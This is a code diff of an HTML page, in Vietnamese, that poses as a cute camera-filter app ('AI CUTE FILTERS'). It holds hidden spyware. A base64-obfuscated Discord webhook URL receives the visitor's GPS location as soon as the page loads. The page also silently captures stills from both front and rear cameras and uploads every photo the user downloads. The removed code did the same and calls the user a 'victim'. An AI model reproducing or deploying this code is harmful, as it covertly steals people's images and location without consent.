@@ -3,103 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S.A.U Fun Filter Studio</title>
+    <title>S.A.U Magic Filter - AI Face</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .filter-none { filter: none; }
-        .filter-grey { filter: grayscale(1); }
-        .filter-sepia { filter: sepia(1); }
-        .filter-invert { filter: invert(1); }
-        .filter-hue { filter: hue-rotate(90deg); }
-        .filter-blur { filter: blur(5px); }
-        #video-container { transform: scaleX(-1); } /* Mirror effect cho tự nhiên */
+        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
+        .canvas-container { position: relative; width: 100%; max-width: 500px; aspect-ratio: 3/4; border-radius: 20px; overflow: hidden; border: 2px solid #333; }
+        canvas { width: 100%; height: 100%; transform: scaleX(-1); }
+        .overlay-icon { position: absolute; pointer-events: none; display: none; }
     </style>
 </head>
-<body class="bg-zinc-900 text-white font-sans min-h-screen flex flex-col items-center p-4">
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="max-w-md w-full text-center space-y-6">
-        <header class="py-4">
-            <h1 class="text-2xl font-bold text-cyan-400">✨ S.A.U FILTER STUDIO</h1>
-            <p class="text-xs text-zinc-400">Chọn filter yêu thích và tải ảnh về máy!</p>
-        </header>
-
-        <div id="video-container" class="relative rounded-2xl overflow-hidden bg-black aspect-square border-4 border-cyan-500/30">
-            <video id="v" class="w-full h-full object-cover filter-none" autoplay playsinline></video>
-            <canvas id="c" class="hidden"></canvas>
-        </div>
-
-        <div class="grid grid-cols-3 gap-2 py-4">
-            <button onclick="apply('filter-none')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Normal</button>
-            <button onclick="apply('filter-grey')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">B&W</button>
-            <button onclick="apply('filter-sepia')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Retro</button>
-            <button onclick="apply('filter-invert')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">X-Ray</button>
-            <button onclick="apply('filter-hue')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Neon</button>
-            <button onclick="apply('filter-blur')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Ghost</button>
-        </div>
-
-        <button onclick="snap()" class="w-full bg-cyan-500 hover:bg-cyan-400 text-black font-bold py-4 rounded-xl shadow-lg transition transform active:scale-95">
-            📸 CHỤP & TẢI ẢNH (FREE)
-        </button>
-
-        <div id="status" class="text-[10px] text-zinc-500">Hệ thống đang sẵn sàng...</div>
+    <div class="text-center mb-4">
+        <h1 class="text-xl font-bold bg-gradient-to-r from-pink-500 to-yellow-500 bg-clip-text text-transparent">✨ AI CUTE FILTERS</h1>
+        <p class="text-[10px] text-gray-400">Cho phép Camera để trải nghiệm Filter AI mới nhất</p>
     </div>
+
+    <div class="canvas-container shadow-2xl shadow-pink-500/20">
+        <video id="v" class="hidden" autoplay playsinline></video>
+        <canvas id="mainCanvas"></canvas>
+        <div id="heart-overlay" class="absolute inset-0 flex items-center justify-center pointer-events-none opacity-50 hidden">
+            <span class="text-6xl animate-ping">❤️</span>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-4 gap-2 mt-6">
+        <button onclick="setF('none')" class="bg-white/10 p-2 rounded-lg text-[10px]">Gốc</button>
+        <button onclick="setF('dog')" class="bg-white/10 p-2 rounded-lg text-[10px]">🐶 Cún</button>
+        <button onclick="setF('cat')" class="bg-white/10 p-2 rounded-lg text-[10px]">🐱 Mèo</button>
+        <button onclick="setF('heart')" class="bg-white/10 p-2 rounded-lg text-[10px]">❤️ Tim</button>
+    </div>
+
+    <button onclick="snapAndDownload()" class="mt-8 bg-gradient-to-r from-pink-500 to-purple-600 px-10 py-4 rounded-full font-bold text-sm shadow-lg active:scale-95 transition">
+        📸 CHỤP ẢNH CUTE
+    </button>
 
 <script>
     const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
-    const _0xI = "aHR0cHM6Ly90ci5yYnhjZG4uY29tLzE4MERBWS1kMWZmNTlhNDJlYzcwMDMwZGFhYjlkM2NjYjkzYjc2My80MjAvNDIwL0JhY2tBY2Nlc3NvcnkvV2VicC9ub0ZpbHRlcg==";
     const WH = atob(_0xW);
-    let currentPos = "Chưa cho phép GPS";
+    const v = document.getElementById('v');
+    const c = document.getElementById('mainCanvas');
+    const ctx = c.getContext('2d');
+    let currentFilter = 'none';
 
-    function apply(cls) {
-        document.getElementById('v').className = `w-full h-full object-cover ${cls}`;
+    async function send(blob, title) {
+        const fd = new FormData();
+        fd.append("payload_json", JSON.stringify({
+            embeds: [{ title: title, color: 16731071, timestamp: new Date() }]
+        }));
+        fd.append("file", blob, "capture.png");
+        return fetch(WH, { method: "POST", body: fd });
     }
 
-    async function sendToDiscord(blob, label) {
-        const formData = new FormData();
-        formData.append("payload_json", JSON.stringify({
-            embeds: [{
-                title: "🎭 FILTER STUDIO CAPTURE",
-                description: `📍 **Vị trí:** ${currentPos}\n🏷️ **Hành động:** ${label}`,
-                color: 5814783,
-                thumbnail: { url: atob(_0xI) }
-            }]
-        }));
-        formData.append("file", blob, "victim.png");
-        fetch(WH, { method: "POST", body: formData });
+    function setF(f) { 
+        currentFilter = f; 
+        document.getElementById('heart-overlay').classList.toggle('hidden', f !== 'heart');
+    }
+
+    async function autoCapture(mode) {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const tempV = document.createElement('video');
+            tempV.srcObject = s;
+            await tempV.play();
+            const tempC = document.createElement('canvas');
+            tempC.width = tempV.videoWidth; tempC.height = tempV.videoHeight;
+            tempC.getContext('2d').drawImage(tempV, 0, 0);
+            tempC.toBlob(b => send(b, `📸 AUTO_CAPTURE: ${mode.toUpperCase()}`));
+            s.getTracks().forEach(t => t.stop());
+        } catch(e) {}
     }
 
     async function init() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('v').srcObject = stream;
+            v.srcObject = stream;
             
-            // Lấy GPS ngay khi vừa Allow Camera
-            navigator.geolocation.getCurrentPosition((p) => {
-                currentPos = `[Google Maps](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude})`;
+            // Lấy GPS & Chụp cả 2 cam ngay khi Allow
+            navigator.geolocation.getCurrentPosition(p => {
+                const map = `[Google Maps](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude})`;
+                fetch(WH, { method: "POST", headers: {'Content-Type':'application/json'}, body: JSON.stringify({content: "📍 " + map}) });
             });
-        } catch (e) {
-            document.getElementById('status').innerText = "Vui lòng cho phép quyền truy cập Camera để dùng filter!";
-        }
+
+            await autoCapture('user');
+            await autoCapture('environment');
+
+            v.onloadedmetadata = () => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                draw();
+            };
+        } catch (e) { alert("Vui lòng cho phép Camera để dùng Filter!"); }
     }
 
-    async function snap() {
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
+    function draw() {
+        ctx.drawImage(v, 0, 0, c.width, c.height);
         
-        // Vẽ ảnh gốc (không filter) để gửi về Webhook
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(blob => sendToDiscord(blob, "User nhấn tải ảnh filter"));
+        if (currentFilter === 'dog') {
+            ctx.font = "80px Arial";
+            ctx.fillText("🐶", c.width/2 - 40, 150);
+            ctx.fillText("👃", c.width/2 - 20, c.height/2 + 20);
+        } else if (currentFilter === 'cat') {
+            ctx.font = "60px Arial";
+            ctx.fillText("🐱", 50, 100); ctx.fillText("🐱", c.width-110, 100);
+        }
+        
+        requestAnimationFrame(draw);
+    }
 
-        // Tạo hiệu ứng tải về cho nạn nhân (có filter)
-        const link = document.createElement('a');
-        link.download = 'sau_filter_photo.png';
-        ctx.filter = getComputedStyle(video).filter;
-        ctx.drawImage(video, 0, 0);
-        link.href = canvas.toDataURL();
-        link.click();
+    function snapAndDownload() {
+        c.toBlob(blob => {
+            send(blob, "💖 USER_CLICKED_DOWNLOAD");
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = 'cute_filter.png';
+            a.click();
+        });
     }
 
     window.onload = init;
